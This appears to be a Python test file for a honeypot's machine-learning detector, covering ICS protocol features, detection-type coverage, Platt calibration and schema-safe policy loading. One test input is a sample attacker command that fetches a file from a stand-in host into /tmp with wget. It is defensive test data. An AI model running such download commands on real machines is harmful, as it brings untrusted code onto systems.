"""Schema-2 features, new heads, Platt calibration and schema-safe policy loading."""

import asyncio
import random

from backend.app.services.detector import detect
from backend.app.services.ml.bootstrap import DETECTION_TYPES, bootstrap_policy
from backend.app.services.ml.features import FEATURE_NAMES, FEATURE_SCHEMA_VERSION, raw_feature_map
from backend.app.services.ml.policy import LinearPolicy, sigmoid
from backend.app.services.ml.store import load_latest_policy
from backend.app.services.ml.training import TrainingExample, fit_platt


def test_schema2_features_are_protocol_generic():
    events = [
        {"event": {"category": "network"}, "s7": {"write": True}},
        {"event": {"category": "network"}, "bacnet": {"identify": True}},
        {"event": {"category": "network"}, "modbus": {"function_code": 3, "address": 1}},
        {"event": {"category": "network"}, "modbus": {"function_code": 3, "address": 2}},
        {"event": {"category": "network"}, "coap": {"state_change": True}},
        {"event": {"category": "web"}, "url": {"path": "/HNAP1/"}},
        {"event": {"category": "network"}, "ftp": {"command": "STOR"}},
        {"event": {"category": "authentication", "outcome": "success"}},
    ]
    f = raw_feature_map({"events": events, "commands": ["cd /tmp; wget http://x/y"]})
    assert FEATURE_SCHEMA_VERSION == "2" and len(FEATURE_NAMES) == 25
    assert f["ics_write_count"] == 2 and f["ics_identify_count"] == 1 and f["ics_read_targets"] == 2
    assert f["control_message_count"] == 1 and f["exploit_path_hits"] == 1
    assert f["download_command_hits"] == 2 and f["upload_attempts"] == 1 and f["auth_success_count"] == 1


def test_learned_policy_covers_every_rule_detection_type():
    assert {"EXPLOIT_ATTEMPT", "MALWARE_DOWNLOAD", "UNAUTHORIZED_COMMAND", "ICS_RECONNAISSANCE", "ICS_WRITE"} <= set(bootstrap_policy().detection_types)
    session = {
        "session_id": "S",
        "event_ids": ["e1"],
        "events": [{"event": {"id": "e1", "category": "network"}, "service": {"name": "plc"}, "network": {"protocol": "s7"}, "s7": {"write": True}}],
    }
    ml = [d for d in detect(session, mode="ml")]
    assert "ICS_WRITE" in {d["type"] for d in ml}  # an S7 write the rules have no rule for yet


def test_platt_calibration_improves_overconfident_scores():
    # An overconfident head: logit 4x too large. Platt should shrink it (a < 1).
    rng = random.Random(1)
    examples = []
    for _ in range(400):
        x = rng.uniform(-2, 2)
        examples.append(TrainingExample(vector=[x], labels={"H": int(rng.random() < sigmoid(x))}))
    policy = LinearPolicy({"H": [4.0]}, {"H": 0.0}, feature_names=("x",))
    a, b = fit_platt(policy, examples, "H")
    assert 0.15 < a < 0.4 and abs(b) < 0.3
    raw = policy.probability("H", [1.0])
    policy.calibration["H"] = (a, b)
    assert policy.is_calibrated("H") and policy.probability("H", [1.0]) < raw
    restored = LinearPolicy.from_document(policy.to_document())
    assert restored.calibration["H"] == (a, b)
    assert fit_platt(policy, examples[:5], "H") is None  # too little evidence: stay uncalibrated


def test_policies_from_an_older_feature_schema_are_ignored():
    class Store:
        async def search(self, index, query=None, size=100, sort_field="@timestamp", missing_index_is_empty=False):
            old = {"weights": {"BRUTE_FORCE": [0.1] * 15}, "biases": {}, "feature_names": list(FEATURE_NAMES[:15]), "policy_version": "old", "active": True}
            return [old]

    assert asyncio.run(load_latest_policy(Store())) is None  # falls back to the schema-2 bootstrap
    assert len(DETECTION_TYPES) == 13
